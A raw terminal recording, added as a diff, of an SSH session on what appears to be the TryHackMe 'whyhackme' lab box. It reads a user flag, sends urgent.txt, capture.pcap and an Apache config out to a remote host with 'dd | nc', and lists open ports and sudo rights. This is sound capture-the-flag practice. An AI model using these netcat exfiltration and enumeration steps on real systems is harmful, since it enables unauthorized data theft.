@@ -1,0 +1,81 @@
+Script started on 2025-03-20 04:08:22+03:00 [COMMAND="ssh jack@whyhackme.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+The authenticity of host 'whyhackme.thm (10.10.236.79)' can't be established.
+ED25519 key fingerprint is SHA256:4vHbB54RGaVtO3RXlzRq50QWtP3O7aQcnFQiVMyKot0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'whyhackme.thm' (ED25519) to the list of known hosts.
+jack@whyhackme.thm's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 20 Mar 2025 01:08:30 AM UTC
+
+  System load:  0.79               Processes:             140
+  Usage of /:   79.7% of 11.21GB   Users logged in:       0
+  Memory usage: 32%                IPv4 address for eth0: 10.10.236.79
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+64 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Jan 29 13:44:19 2024
+]0;jack@ubuntu: ~[01;32mjack@ubuntu[00m:[01;34m~[00m$ ls
+user.txt
+]0;jack@ubuntu: ~[01;32mjack@ubuntu[00m:[01;34m~[00m$ cat user.txt
+1ca4eb201787acbfcf9e70fca87b866a
+]0;jack@ubuntu: ~[01;32mjack@ubuntu[00m:[01;34m~[00m$ find [K[K[K[K[Kfind / -name *.txt -type f 2>/dev/null
+/home/jack/user.txt
+]0;jack@ubuntu: ~[01;32mjack@ubuntu[00m:[01;34m~[00m$ cd /opt
+]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ ls
+capture.pcap  urgent.txt
+]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ cat [K[K[K[Kdd if=urgent.txt status=progress | nc 10.8.61.245 4444
+0+1 records in
+0+1 records out
+388 bytes copied, 0.107972 s, 3.6 kB/s
+]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ dd if=urgent.txt status=progress | nc 10.8.61.245 4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[3P[7P[12@capture.pcap
+53+1 records in
+53+1 records out
+27247 bytes (27 kB, 27 KiB) copied, 0.00163418 s, 16.7 MB/s
+]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ cd /usr/lib/cgi-bin/
+-bash: cd: /usr/lib/cgi-bin/: Permission denied
+]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ ls /usr/lib/cgi-bin/
+ls: cannot open directory '/usr/lib/cgi-bin/': Permission denied
+]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ ls /usr/lib/cgi-bin/[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccd[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cdd if=capture.pcap status=progress | nc 10.8.61.245 4444[C[C[4P[8P/etc/apache2/sites-enabled/OOO-default.conf status=progress | nc 10.8.61.245 4444[A]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cdefault.conf status=progress | nc 10.8.61.245 4444 [K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1@0[1@00default.conf status=progress | nc 10.8.61.245 4444 [A]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C-default.conf status=progress | nc 10.8.61.245 4444[A]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+4+1 records in
+4+1 records out
+2139 bytes (2.1 kB, 2.1 KiB) copied, 0.000782606 s, 2.7 MB/s
+]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ ss -tln
+State      Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process     
+LISTEN     0           511                    0.0.0.0:80                   0.0.0.0:*                    
+LISTEN     0           32                     0.0.0.0:21                   0.0.0.0:*                    
+LISTEN     0           4096             127.0.0.53%lo:53                   0.0.0.0:*                    
+LISTEN     0           128                    0.0.0.0:22                   0.0.0.0:*                    
+LISTEN     0           511                    0.0.0.0:41312                0.0.0.0:*                    
+LISTEN     0           80                   127.0.0.1:3306                 0.0.0.0:*                    
+]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ sudo -0[Kl
+[sudo] password for jack: 
+Matching Defaults entries for jack on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jack may run the following commands on ubuntu:
+    (ALL : ALL) /usr/sbin/iptables
+]0;jack@ubuntu: /opt[01;32mjack@ubuntu[00m:[01;34m/opt[00m$ exit
+logout
+Connection to whyhackme.thm closed.
+
+Script done on 2025-03-20 04:17:29+03:00 [COMMAND_EXIT_CODE="0"]
